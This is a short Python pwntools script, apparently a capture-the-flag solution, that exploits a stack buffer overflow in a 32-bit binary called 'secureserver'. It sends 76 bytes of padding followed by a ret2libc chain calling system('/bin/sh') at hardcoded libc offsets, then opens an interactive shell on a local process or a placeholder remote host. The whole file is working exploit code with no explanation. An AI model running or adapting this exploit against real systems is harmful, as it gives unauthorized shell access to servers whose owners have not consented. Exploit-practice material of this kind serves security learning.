#!/usr/bin/env python3

from pwn import *

exe = ELF("./secureserver")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)

    libcbase = 0xf7d76000
    system = libcbase + 0x4f5b0
    binsh = libcbase + 0x1bbddc
    r.sendlineafter(b':', b'A'*76 + p32(system) + p32(0x0) + p32(binsh))
    r.interactive()


if __name__ == "__main__":
    main()
